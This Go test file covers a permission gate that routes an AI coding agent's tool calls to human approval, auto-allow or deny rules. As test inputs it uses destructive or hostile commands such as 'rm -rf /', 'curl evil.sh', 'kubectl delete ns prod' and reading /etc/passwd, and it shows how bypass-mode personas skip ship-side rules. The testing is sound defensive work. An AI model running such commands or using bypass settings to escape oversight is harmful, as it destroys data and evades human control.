package server

import (
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/luthermonson/shipmates/internal/brig"
	"github.com/luthermonson/shipmates/internal/permissions"
)

// waitPending blocks until the server has exactly one pending permission
// request and returns its id. Fails the test rather than hanging forever if
// the gate never opens.
func waitPending(t *testing.T, s *Server) string {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		s.mu.Lock()
		for id := range s.pendings {
			s.mu.Unlock()
			return id
		}
		s.mu.Unlock()
		time.Sleep(2 * time.Millisecond)
	}
	t.Fatal("timed out waiting for a pending permission request")
	return ""
}

// eventTypes returns the recorded event types, oldest first.
func eventTypes(s *Server) []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]string, 0, len(s.events))
	for _, e := range s.events {
		out = append(out, e.Type)
	}
	return out
}

func hasEventType(s *Server, want string) bool {
	for _, got := range eventTypes(s) {
		if got == want {
			return true
		}
	}
	return false
}

func TestSummarizeToolInput(t *testing.T) {
	cases := []struct {
		name  string
		tool  string
		input map[string]any
		want  string
	}{
		{"nil input", "Bash", nil, ""},
		{"bash command", "Bash", map[string]any{"command": "rm -rf /tmp/x"}, "rm -rf /tmp/x"},
		{"powershell command", "PowerShell", map[string]any{"command": "Get-ChildItem"}, "Get-ChildItem"},
		{"read path", "Read", map[string]any{"file_path": "/etc/passwd"}, "/etc/passwd"},
		{"write path", "Write", map[string]any{"file_path": "a.txt"}, "a.txt"},
		{"edit path", "Edit", map[string]any{"file_path": "b.go"}, "b.go"},
		// Wrong-typed or missing canonical field must fall through to the JSON
		// dump rather than silently summarizing as "" — an empty summary in
		// the approval UI is how an operator approves something unseen.
		{"bash non-string command", "Bash", map[string]any{"command": 42.0}, `{"command":42}`},
		{"read missing path", "Read", map[string]any{"offset": 1.0}, `{"offset":1}`},
		{"unknown tool", "Grep", map[string]any{"pattern": "x"}, `{"pattern":"x"}`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := summarizeToolInput(tc.tool, tc.input); got != tc.want {
				t.Fatalf("summarizeToolInput(%q, %v) = %q, want %q", tc.tool, tc.input, got, tc.want)
			}
		})
	}
}

// TestHookSettingsGate pins the --settings blob handed to spawned crew. The
// gate flag is the difference between "the fleet's pending pane is the only
// approval surface" (headless) and "claude prompts in the terminal" (PTY);
// getting it backwards either double-prompts or silently ungates a mate.
func TestHookSettingsGate(t *testing.T) {
	s := &Server{port: 54321}

	for _, gate := range []bool{true, false} {
		var out struct {
			Hooks map[string][]struct {
				Hooks []struct {
					Type    string `json:"type"`
					URL     string `json:"url"`
					Timeout int    `json:"timeout"`
				} `json:"hooks"`
			} `json:"hooks"`
		}
		if err := json.Unmarshal([]byte(s.hookSettings("back end", gate)), &out); err != nil {
			t.Fatalf("gate=%v: settings is not valid JSON: %v", gate, err)
		}

		post, ok := out.Hooks["PostToolUse"]
		if !ok || len(post) != 1 || len(post[0].Hooks) != 1 {
			t.Fatalf("gate=%v: PostToolUse observe hook missing: %+v", gate, out.Hooks)
		}
		h := post[0].Hooks[0]
		if h.Type != "http" {
			t.Errorf("gate=%v: hook type = %q, want http", gate, h.Type)
		}
		if want := "http://127.0.0.1:54321/hook/back end/PostToolUse"; h.URL != want {
			t.Errorf("gate=%v: url = %q, want %q", gate, h.URL, want)
		}

		pre, hasPre := out.Hooks["PreToolUse"]
		if gate != hasPre {
			t.Fatalf("gate=%v: PreToolUse present=%v, want %v", gate, hasPre, gate)
		}
		if gate {
			if pre[0].Hooks[0].Timeout != 120 {
				t.Errorf("gated PreToolUse needs a generous timeout, got %d", pre[0].Hooks[0].Timeout)
			}
			if !strings.HasSuffix(pre[0].Hooks[0].URL, "/PreToolUse") {
				t.Errorf("PreToolUse url = %q", pre[0].Hooks[0].URL)
			}
		}
	}
}

func TestDecidePermissionAutoAllowAndDeny(t *testing.T) {
	s, _ := newTestServer(t)
	s.perms = permissions.NewEvaluatorWithRules(rulesFromRaw(
		[]string{"Bash(git status)"}, nil, []string{"Bash(rm *)"},
	))

	d, reason := s.decidePermission("backend", "Bash", map[string]any{"command": "git status"}, "git status")
	if d != "allow" || reason == "" {
		t.Fatalf("allow rule = (%q, %q), want allow with a reason", d, reason)
	}
	if !hasEventType(s, "permission:auto-allow") {
		t.Fatalf("auto-allow must be visible in the feed, got %v", eventTypes(s))
	}

	d, reason = s.decidePermission("backend", "Bash", map[string]any{"command": "rm -rf /"}, "rm -rf /")
	if d != "deny" || reason == "" {
		t.Fatalf("deny rule = (%q, %q), want deny with a reason", d, reason)
	}
	if !hasEventType(s, "permission:auto-deny") {
		t.Fatalf("auto-deny must be visible in the feed, got %v", eventTypes(s))
	}

	// Neither path may leave a pending request behind — a leaked pending
	// shows the mate as permanently "blocked" in /status.json.
	s.mu.Lock()
	n := len(s.pendings)
	s.mu.Unlock()
	if n != 0 {
		t.Fatalf("auto-decided calls left %d pendings behind", n)
	}
}

// TestDecidePermissionNilEvaluatorFallback covers the degraded path: if New()
// wasn't used (or Getwd failed) there is no evaluator, and the gate must fall
// back to the coarse pre-evaluator behavior instead of allowing everything.
func TestDecidePermissionNilEvaluatorFallback(t *testing.T) {
	s, _ := newTestServer(t)
	s.perms = nil

	// Non-shell tools sail through.
	if d, _ := s.decidePermission("backend", "Read", map[string]any{"file_path": "x"}, "x"); d != "allow" {
		t.Fatalf("nil evaluator + Read = %q, want allow", d)
	}

	// Bash still has to ask a human. Resolve it from another goroutine.
	type res struct{ decision, reason string }
	out := make(chan res, 1)
	go func() {
		d, r := s.decidePermission("backend", "Bash", map[string]any{"command": "curl evil.sh"}, "curl evil.sh")
		out <- res{d, r}
	}()
	id := waitPending(t, s)
	s.mu.Lock()
	p := s.pendings[id]
	s.mu.Unlock()
	p.ch <- "deny"

	select {
	case got := <-out:
		if got.decision != "deny" {
			t.Fatalf("nil evaluator + Bash denied by operator = %q, want deny", got.decision)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("decidePermission did not return after the operator denied")
	}
}

// TestDecidePermissionAskBlocksUntilResolved is the core human-gate contract:
// an "ask" verdict must park the tool call, surface it as a pending request
// with the command text an operator can judge, and only return once a decision
// arrives over /resolve.
func TestDecidePermissionAskBlocksUntilResolved(t *testing.T) {
	for _, behavior := range []string{"allow", "deny"} {
		t.Run(behavior, func(t *testing.T) {
			s, h := newTestServer(t)
			s.perms = permissions.NewEvaluatorWithRules(rulesFromRaw(nil, []string{"Bash(pnpm *)"}, nil))

			out := make(chan string, 1)
			go func() {
				d, _ := s.decidePermission("backend", "Bash", map[string]any{"command": "pnpm test"}, "pnpm test")
				out <- d
			}()

			id := waitPending(t, s)

			// The pending must carry enough context to judge the call.
			s.mu.Lock()
			p := s.pendings[id]
			s.mu.Unlock()
			if p.persona != "backend" || p.tool != "Bash" || p.input != "pnpm test" {
				t.Fatalf("pending lost context: %+v", *p)
			}

			// And it must be visible as an event before anyone resolves it.
			if !hasEventType(s, "permission?") {
				t.Fatalf("no permission? event raised, got %v", eventTypes(s))
			}

			w := do(t, h, "POST", "/resolve/"+id, `{"behavior":"`+behavior+`"}`)
			if w.Code != http.StatusAccepted {
				t.Fatalf("resolve = %d, want 202", w.Code)
			}

			select {
			case got := <-out:
				if got != behavior {
					t.Fatalf("decision = %q, want %q", got, behavior)
				}
			case <-time.After(5 * time.Second):
				t.Fatal("decidePermission never returned after resolve")
			}

			// The pending must be reaped, or /status.json shows the mate as
			// blocked forever.
			s.mu.Lock()
			n := len(s.pendings)
			s.mu.Unlock()
			if n != 0 {
				t.Fatalf("%d pendings left after resolve", n)
			}
			if !hasEventType(s, "permission:"+behavior) {
				t.Fatalf("no permission:%s event, got %v", behavior, eventTypes(s))
			}
		})
	}
}

// TestResolveTimeBoxGrant covers the "--for 5m" path: approving with a
// duration must register the grant on the evaluator BEFORE the pending is
// unblocked, so the very next identical call — which can race in immediately —
// already sees it.
func TestResolveTimeBoxGrant(t *testing.T) {
	s, h := newTestServer(t)
	s.perms = permissions.NewEvaluatorWithRules(rulesFromRaw(nil, []string{"Bash(pnpm *)"}, nil))

	out := make(chan string, 1)
	go func() {
		d, _ := s.decidePermission("backend", "Bash", map[string]any{"command": "pnpm test"}, "pnpm test")
		out <- d
	}()
	id := waitPending(t, s)
	if w := do(t, h, "POST", "/resolve/"+id, `{"behavior":"allow","duration":"5m"}`); w.Code != http.StatusAccepted {
		t.Fatalf("resolve = %d", w.Code)
	}
	if got := <-out; got != "allow" {
		t.Fatalf("first decision = %q", got)
	}

	// Same persona, same command: auto-allowed by the time-box, no gate.
	d, reason := s.decidePermission("backend", "Bash", map[string]any{"command": "pnpm test"}, "pnpm test")
	if d != "allow" || !strings.HasPrefix(reason, "time-boxed until ") {
		t.Fatalf("second call = (%q, %q), want a time-boxed allow", d, reason)
	}
	if !hasEventType(s, "permission:time-box-allow") {
		t.Fatalf("time-boxed allow needs its own event type, got %v", eventTypes(s))
	}

	// A DIFFERENT persona must not inherit the grant.
	done := make(chan struct{})
	go func() {
		defer close(done)
		s.decidePermission("security", "Bash", map[string]any{"command": "pnpm test"}, "pnpm test")
	}()
	id2 := waitPending(t, s)
	s.mu.Lock()
	p2 := s.pendings[id2]
	s.mu.Unlock()
	if p2.persona != "security" {
		t.Fatalf("expected the security mate to be gated, got %q", p2.persona)
	}
	p2.ch <- "deny"
	<-done
}

func TestResolveBadDurationStillApproves(t *testing.T) {
	// A malformed duration must not wedge the crew: honor the allow, skip the
	// grant. Dropping the request instead would leave the mate hung.
	s, h := newTestServer(t)
	s.perms = permissions.NewEvaluatorWithRules(rulesFromRaw(nil, []string{"Bash"}, nil))

	out := make(chan string, 1)
	go func() {
		d, _ := s.decidePermission("backend", "Bash", map[string]any{"command": "ls"}, "ls")
		out <- d
	}()
	id := waitPending(t, s)
	if w := do(t, h, "POST", "/resolve/"+id, `{"behavior":"allow","duration":"five minutes"}`); w.Code != http.StatusAccepted {
		t.Fatalf("resolve with bad duration = %d, want 202", w.Code)
	}
	if got := <-out; got != "allow" {
		t.Fatalf("decision = %q, want allow", got)
	}
	if hasEventType(s, "permission:time-box") {
		t.Fatal("a malformed duration must not register a time-box")
	}
	// No grant means the next call is gated again.
	if d := s.perms.EvaluateFor("backend", "Bash", map[string]any{"command": "ls"}); d.Effect != permissions.EffectAsk {
		t.Fatalf("expected the next call to still ask, got %v", d.Effect)
	}
}

func TestResolveValidation(t *testing.T) {
	s, h := newTestServer(t)
	s.mu.Lock()
	s.pendings["live1"] = &pending{id: "live1", persona: "x", tool: "Bash", ch: make(chan string, 1)}
	s.mu.Unlock()

	cases := []struct {
		name, id, body string
		want           int
	}{
		{"malformed json", "live1", "{", http.StatusBadRequest},
		{"empty body", "live1", "", http.StatusBadRequest},
		{"unknown behavior", "live1", `{"behavior":"maybe"}`, http.StatusBadRequest},
		{"empty behavior", "live1", `{}`, http.StatusBadRequest},
		// Behavior is validated BEFORE the id lookup, so garbage bodies fail
		// the same way whether or not the id exists.
		{"unknown id", "nope", `{"behavior":"allow"}`, http.StatusNotFound},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if w := do(t, h, "POST", "/resolve/"+tc.id, tc.body); w.Code != tc.want {
				t.Fatalf("= %d, want %d (body %q)", w.Code, tc.want, w.Body.String())
			}
		})
	}
}

// TestResolveDoubleDoesNotWedgeTheHandler is the regression guard for a real
// hang: pending.ch is buffered to exactly one decision, so a blocking send
// meant a second resolve for the same id (UI double-click, fleet-proxy retry,
// two operators) parked an HTTP handler goroutine forever. First decision wins;
// every later one gets 409 promptly.
func TestResolveDoubleDoesNotWedgeTheHandler(t *testing.T) {
	s, h := newTestServer(t)
	// Nobody is reading this channel — exactly the state after awaitDecision
	// has already taken its decision but before the map entry is dropped.
	s.mu.Lock()
	s.pendings["stuck"] = &pending{id: "stuck", persona: "x", tool: "Bash", ch: make(chan string, 1)}
	s.mu.Unlock()

	codes := make(chan int, 4)
	for i := 0; i < 4; i++ {
		go func() { codes <- do(t, h, "POST", "/resolve/stuck", `{"behavior":"allow"}`).Code }()
	}

	accepted, conflict := 0, 0
	for i := 0; i < 4; i++ {
		select {
		case c := <-codes:
			switch c {
			case http.StatusAccepted:
				accepted++
			case http.StatusConflict:
				conflict++
			default:
				t.Fatalf("unexpected status %d", c)
			}
		case <-time.After(10 * time.Second):
			t.Fatal("a /resolve handler wedged on a full pending channel")
		}
	}
	if accepted != 1 || conflict != 3 {
		t.Fatalf("accepted=%d conflict=%d, want exactly one winner", accepted, conflict)
	}
}

// TestHookPreToolUseResponseShape pins the wire contract with Claude Code. An
// empty 200 is read as "allow", so a gated tool MUST come back with an
// explicit hookSpecificOutput block.
func TestHookPreToolUseResponseShape(t *testing.T) {
	type hookResp struct {
		Out struct {
			HookEventName            string `json:"hookEventName"`
			PermissionDecision       string `json:"permissionDecision"`
			PermissionDecisionReason string `json:"permissionDecisionReason"`
		} `json:"hookSpecificOutput"`
	}

	cases := []struct {
		name       string
		rules      permissions.MergedRules
		command    string
		wantDecide string
	}{
		{"allowed", rulesFromRaw([]string{"Bash(git *)"}, nil, nil), "git log", "allow"},
		{"denied", rulesFromRaw(nil, nil, []string{"Bash(rm *)"}), "rm -rf /", "deny"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s, h := newTestServer(t)
			s.perms = permissions.NewEvaluatorWithRules(tc.rules)

			body := `{"tool_name":"Bash","tool_input":{"command":"` + tc.command + `"}}`
			w := do(t, h, "POST", "/hook/backend/PreToolUse", body)
			if w.Code != http.StatusOK {
				t.Fatalf("hook = %d", w.Code)
			}
			if ct := w.Header().Get("Content-Type"); ct != "application/json" {
				t.Fatalf("Content-Type = %q", ct)
			}
			var resp hookResp
			if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
				t.Fatalf("decode: %v (%s)", err, w.Body.String())
			}
			if resp.Out.HookEventName != "PreToolUse" {
				t.Errorf("hookEventName = %q", resp.Out.HookEventName)
			}
			if resp.Out.PermissionDecision != tc.wantDecide {
				t.Errorf("permissionDecision = %q, want %q", resp.Out.PermissionDecision, tc.wantDecide)
			}
			if resp.Out.PermissionDecisionReason == "" {
				t.Error("an auto-decision must explain itself to the operator")
			}

			// The gate must also record what it saw, with the command text.
			s.mu.Lock()
			defer s.mu.Unlock()
			var sawHook bool
			for _, e := range s.events {
				if e.Type == "hook:PreToolUse" && e.Tool == "Bash" && e.Input == tc.command {
					sawHook = true
				}
			}
			if !sawHook {
				t.Fatalf("no hook:PreToolUse event carrying the command: %+v", s.events)
			}
		})
	}
}

func TestHookObserveEventsAreNotGates(t *testing.T) {
	// PostToolUse (and anything else) is observe-only: record and get out of
	// the way with a plain {} — never a permissionDecision.
	s, h := newTestServer(t)
	w := do(t, h, "POST", "/hook/backend/PostToolUse", `{"tool_name":"Read","tool_input":{"file_path":"a.go"}}`)
	if w.Code != http.StatusOK {
		t.Fatalf("= %d", w.Code)
	}
	if got := strings.TrimSpace(w.Body.String()); got != "{}" {
		t.Fatalf("observe hook body = %q, want {}", got)
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if len(s.events) != 1 || s.events[0].Type != "hook:PostToolUse" || s.events[0].Input != "a.go" {
		t.Fatalf("bad event: %+v", s.events)
	}
}

func TestHookMissingToolNameStillRecords(t *testing.T) {
	s, h := newTestServer(t)
	if w := do(t, h, "POST", "/hook/backend/PostToolUse", `{}`); w.Code != http.StatusOK {
		t.Fatalf("= %d", w.Code)
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if len(s.events) != 1 || s.events[0].Text != "(no tool_name)" {
		t.Fatalf("bad event: %+v", s.events)
	}
}

// writePersona drops a persona markdown file with the given frontmatter into
// the sandbox's .claude/agents.
func writePersona(t *testing.T, name, frontmatter string) {
	t.Helper()
	if err := os.MkdirAll(".claude/agents", 0o755); err != nil {
		t.Fatal(err)
	}
	body := "---\n" + frontmatter + "\n---\n\nbody\n"
	if err := os.WriteFile(filepath.Join(".claude/agents", name+".md"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestPersonaPermissive(t *testing.T) {
	cases := []struct {
		name        string
		frontmatter string
		want        bool
	}{
		{"plain persona", "name: x", false},
		{"explicit default mode", "permissions:\n  mode: default", false},
		{"acceptEdits is still gated", "permissions:\n  mode: acceptEdits", false},
		{"bypassPermissions", "permissions:\n  mode: bypassPermissions", true},
		{"dangerouslySkipPermissions", "dangerouslySkipPermissions: true", true},
		{"dangerouslySkipPermissions false", "dangerouslySkipPermissions: false", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Chdir(t.TempDir())
			writePersona(t, "mate", tc.frontmatter)
			if got := personaPermissive("mate"); got != tc.want {
				t.Fatalf("personaPermissive = %v, want %v", got, tc.want)
			}
		})
	}
}

func TestPersonaPermissiveUnknownPersonaFailsClosed(t *testing.T) {
	t.Chdir(t.TempDir())
	if personaPermissive("ghost") {
		t.Fatal("an unresolvable persona must not be treated as permissive")
	}
}

// TestBypassModeSkipsTheEvaluator pins the resolution of what used to be a
// sharp edge, decided via Article 14 (No Self-Escalation): a persona in
// bypass mode still skips the ship-side layers (persona overlay, project
// settings, the Brig's kernel rules), but the FLEET-WIDE deny list now binds
// it — decidePermission consults FleetDeny before the bypass allow, so
// ship-local persona frontmatter can no longer shadow an Admiral's deny.
// This is a deliberate behavior change from the previously pinned "bypass
// escapes everything" state.
func TestBypassModeSkipsTheEvaluator(t *testing.T) {
	s, _ := newTestServer(t)
	writePersona(t, "cowboy", "dangerouslySkipPermissions: true")
	s.perms = permissions.NewEvaluatorWithRules(rulesFromRaw(nil, nil, []string{"Bash(rm *)"}))
	s.perms.SetFleetPolicy(&permissions.FleetPolicy{Deny: []string{"Bash(kubectl *)"}})

	// Sanity: a normal mate is denied by the ship-side deny.
	if d, _ := s.decidePermission("backend", "Bash", map[string]any{"command": "rm -rf /"}, "rm -rf /"); d != "deny" {
		t.Fatalf("normal mate = %q, want deny", d)
	}
	// The bypass mate skips the ship-side layers: the same command that the
	// ship denies is allowed for it.
	d, _ := s.decidePermission("cowboy", "Bash", map[string]any{"command": "rm -rf /"}, "rm -rf /")
	if d != "allow" {
		t.Fatalf("bypass mate = %q, want allow: bypass must still skip persona/project layers", d)
	}
	if !hasEventType(s, "permission:auto-allow") {
		t.Fatal("a bypassed call must still be recorded in the feed")
	}
	// Article 14: the fleet-wide deny is NOT skippable. The bypass mate is
	// denied the fleet-denied command.
	d, reason := s.decidePermission("cowboy", "Bash", map[string]any{"command": "kubectl delete ns prod"}, "kubectl delete ns prod")
	if d != "deny" {
		t.Fatalf("bypass mate vs fleet deny = %q, want deny (Article 14: bypass must not shadow fleet policy)", d)
	}
	if !strings.Contains(reason, "fleet-deny") {
		t.Fatalf("deny reason %q should name the fleet layer", reason)
	}
}

// TestBypassModeFleetDenyHoldsWithBrigDisabled pins the hard exception in
// the brig's configurability contract: the fleet-wide deny list is not the
// Brig's to disable. `brig.enabled: false` returns the ship to the pre-brig
// posture — it does not grant a NEW escape from fleet policy, so a
// bypass-mode persona is still denied a fleet-denied tool.
func TestBypassModeFleetDenyHoldsWithBrigDisabled(t *testing.T) {
	s, _ := newTestServer(t)
	s.brigConf = brig.Settings{Enabled: false} // operator turned the brig off
	writePersona(t, "cowboy", "dangerouslySkipPermissions: true")
	s.perms = permissions.NewEvaluatorWithRules(rulesFromRaw(nil, nil, nil))
	s.perms.SetFleetPolicy(&permissions.FleetPolicy{Deny: []string{"Bash(kubectl *)"}})

	d, reason := s.decidePermission("cowboy", "Bash", map[string]any{"command": "kubectl delete ns prod"}, "kubectl delete ns prod")
	if d != "deny" {
		t.Fatalf("brig disabled + fleet deny + bypass = %q, want deny: brig off must not waive fleet policy", d)
	}
	if !strings.Contains(reason, "fleet-deny") {
		t.Fatalf("deny reason %q should name the fleet layer", reason)
	}
}

func TestAwaitDecisionEmitsJudgeableText(t *testing.T) {
	// The operator sees Text in the pending pane; without the command it is
	// an unjudgeable "backend wants Bash".
	s, _ := newTestServer(t)
	done := make(chan struct{})
	go func() { defer close(done); s.awaitDecision("backend", "Bash", "kubectl delete ns prod") }()
	id := waitPending(t, s)
	defer func() {
		s.mu.Lock()
		p := s.pendings[id]
		s.mu.Unlock()
		if p != nil {
			p.ch <- "deny"
		}
		<-done
	}()

	s.mu.Lock()
	defer s.mu.Unlock()
	for _, e := range s.events {
		if e.Type == "permission?" {
			if e.ID != id {
				t.Fatalf("event ID %q != pending id %q", e.ID, id)
			}
			if !strings.Contains(e.Text, "kubectl delete ns prod") || !strings.Contains(e.Text, "backend") {
				t.Fatalf("permission? text %q lacks the command or persona", e.Text)
			}
			return
		}
	}
	t.Fatal("no permission? event")
}

func TestAwaitDecisionNoInputStillReadable(t *testing.T) {
	s, _ := newTestServer(t)
	done := make(chan struct{})
	go func() { defer close(done); s.awaitDecision("backend", "Task", "") }()
	id := waitPending(t, s)

	s.mu.Lock()
	var text string
	for _, e := range s.events {
		if e.Type == "permission?" {
			text = e.Text
		}
	}
	p := s.pendings[id]
	s.mu.Unlock()

	p.ch <- "deny"
	<-done

	if text != "backend wants Task" {
		t.Fatalf("text = %q, want %q", text, "backend wants Task")
	}
}
